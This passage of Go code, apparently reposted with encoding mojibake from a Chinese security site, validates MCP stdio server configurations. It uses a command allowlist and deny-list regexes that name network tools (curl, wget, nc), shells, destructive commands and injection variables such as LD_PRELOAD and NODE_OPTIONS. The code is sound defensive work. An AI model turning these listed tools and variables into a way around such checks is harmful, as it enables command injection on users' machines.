Â  Â  regexp.MustCompile(`(?i)^/bin/`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Direct binary path
Â  Â  regexp.MustCompile(`(?i)^/usr/bin/`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Direct binary path
Â  Â  regexp.MustCompile(`(?i)^/sbin/`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // Direct binary path
Â  Â  regexp.MustCompile(`(?i)^/usr/sbin/`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â // Direct binary path
Â  Â  regexp.MustCompile(`(?i)^\.\./`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Path traversal
Â  Â  regexp.MustCompile(`(?i)/\.\./`), Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Path traversal in middle
Â  Â  regexp.MustCompile(`(?i)^(bash|sh|zsh|ksh|csh|tcsh|fish|dash)$`),Â // Shell interpreters as args
Â  Â  regexp.MustCompile(`(?i)^(curl|wget|nc|netcat|ncat)$`), Â  Â  Â  Â  Â Â // Network tools as args
Â  Â  regexp.MustCompile(`(?i)^(rm|dd|mkfs|fdisk)$`), Â  Â  Â  Â  Â  Â  Â  Â  Â Â // Destructive commands as args
}

// DangerousEnvVarPatterns contains patterns for dangerous environment variable names or values
varÂ DangerousEnvVarPatterns = []*regexp.Regexp{
Â  Â  regexp.MustCompile(`(?i)^LD_PRELOAD$`), Â  Â  Â // Library injection
Â  Â  regexp.MustCompile(`(?i)^LD_LIBRARY_PATH$`),Â // Library path manipulation
Â  Â  regexp.MustCompile(`(?i)^DYLD_`), Â  Â  Â  Â  Â  Â // macOS dynamic linker
Â  Â  regexp.MustCompile(`(?i)^PATH$`), Â  Â  Â  Â  Â  Â // PATH manipulation
Â  Â  regexp.MustCompile(`(?i)^PYTHONPATH$`), Â  Â  Â // Python path manipulation
Â  Â  regexp.MustCompile(`(?i)^NODE_OPTIONS$`), Â  Â // Node.js options injection
Â  Â  regexp.MustCompile(`(?i)^BASH_ENV$`), Â  Â  Â  Â // Bash environment file
Â  Â  regexp.MustCompile(`(?i)^ENV$`), Â  Â  Â  Â  Â  Â Â // Shell environment file
Â  Â  regexp.MustCompile(`(?i)^SHELL$`), Â  Â  Â  Â  Â Â // Shell override
}

// ValidateStdioCommand validates the command for MCP stdio transport
// Returns an error if the command is not in the whitelist or contains dangerous patterns
funcÂ ValidateStdioCommand(commandÂ string)Â errorÂ {
Â  Â Â ifÂ command ==Â ""Â {
Â  Â  Â  Â Â returnÂ fmt.Errorf("command cannot be empty")
Â  Â  }

Â  Â Â // Normalize command (extract base name if it's a path)
Â  Â  baseCommand := command
Â  Â Â ifÂ strings.Contains(command,Â "/") {
Â  Â  Â  Â  parts := strings.Split(command,Â "/")
Â  Â  Â  Â  baseCommand = parts[len(parts)-1]
Â  Â  }

Â  Â Â // Check against whitelist
Â  Â Â ifÂ !AllowedStdioCommands[baseCommand] {
Â  Â  Â  Â Â returnÂ fmt.Errorf("command '%s' is not in the allowed list. Allowed commands: uvx, npx, node, python, python3, deno, bun", baseCommand)
Â  Â  }

Â  Â Â // Additional check: command should not contain path traversal
Â  Â Â ifÂ strings.Contains(command,Â "..") {
Â  Â  Â  Â Â returnÂ fmt.Errorf("command path contains invalid characters")
Â  Â  }

Â  Â Â returnÂ nil
}

// ValidateStdioArgs validates the arguments for MCP stdio transport
// Returns an error if any argument contains dangerous patterns
funcÂ ValidateStdioArgs(args []string)Â errorÂ {
Â  Â Â ifÂ len(args) ==Â 0Â {
Â  Â  Â  Â Â returnÂ nil
Â  Â  }

Â  Â Â forÂ i, arg :=Â rangeÂ args {
Â  Â  Â  Â Â // Check length
Â  Â  Â  Â Â ifÂ len(arg) >Â 1024Â {
Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("argument %d exceeds maximum length (1024 characters)", i)
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check against dangerous patterns
Â  Â  Â  Â Â forÂ _, pattern :=Â rangeÂ DangerousArgPatterns {
Â  Â  Â  Â  Â  Â Â ifÂ pattern.MatchString(arg) {
Â  Â  Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("argument %d contains potentially dangerous pattern: %s", i, SanitizeForLog(arg))
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check for null bytes
Â  Â  Â  Â Â ifÂ strings.Contains(arg,Â "\x00") {
Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("argument %d contains null bytes", i)
Â  Â  Â  Â  }
Â  Â  }

Â  Â Â returnÂ nil
}

// ValidateStdioEnvVars validates environment variables for MCP stdio transport
// Returns an error if any env var name or value is dangerous
funcÂ ValidateStdioEnvVars(envVarsÂ map[string]string)Â errorÂ {
Â  Â Â ifÂ len(envVars) ==Â 0Â {
Â  Â  Â  Â Â returnÂ nil
Â  Â  }

Â  Â Â forÂ key, value :=Â rangeÂ envVars {
Â  Â  Â  Â Â // Check key against dangerous patterns
Â  Â  Â  Â Â forÂ _, pattern :=Â rangeÂ DangerousEnvVarPatterns {
Â  Â  Â  Â  Â  Â Â ifÂ pattern.MatchString(key) {
Â  Â  Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("environment variable '%s' is not allowed for security reasons", key)
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check key length
Â  Â  Â  Â Â ifÂ len(key) >Â 256Â {
Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("environment variable name '%s' exceeds maximum length", SanitizeForLog(key[:50]))
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check value length
Â  Â  Â  Â Â ifÂ len(value) >Â 4096Â {
Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("environment variable '%s' value exceeds maximum length", key)
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check for null bytes in value
Â  Â  Â  Â Â ifÂ strings.Contains(value,Â "\x00") {
Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("environment variable '%s' value contains null bytes", key)
Â  Â  Â  Â  }

Â  Â  Â  Â Â // Check value for shell injection patterns
Â  Â  Â  Â Â forÂ _, pattern :=Â rangeÂ DangerousArgPatterns {
Â  Â  Â  Â  Â  Â Â ifÂ pattern.MatchString(value) {
Â  Â  Â  Â  Â  Â  Â  Â Â returnÂ fmt.Errorf("environment variable '%s' value contains potentially dangerous pattern", key)
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  }
Â  Â  }

Â  Â Â returnÂ nil
}

// ValidateStdioConfig performs comprehensive validation of stdio configuration
// This should be called before creating or executing any stdio-based MCP client
funcÂ ValidateStdioConfig(commandÂ string, args []string, envVarsÂ map[string]string)Â errorÂ {
Â  Â Â // Validate command
Â  Â Â ifÂ err := ValidateStdioCommand(command); err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ fmt.Errorf("invalid command: %w", err)
Â  Â  }

Â  Â Â // Validate arguments
Â  Â Â ifÂ err := ValidateStdioArgs(args); err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ fmt.Errorf("invalid arguments: %w", err)
Â  Â  }

Â  Â Â // Validate environment variables
Â  Â Â ifÂ err := ValidateStdioEnvVars(envVars); err !=Â nilÂ {
Â  Â  Â  Â Â returnÂ fmt.Errorf("invalid environment variables: %w", err)
Â  Â  }

Â  Â Â returnÂ nil
```  
  
  
åŸæ–‡é“¾æ¥ï¼šhttps://xz.aliyun.com/news/91166  
  
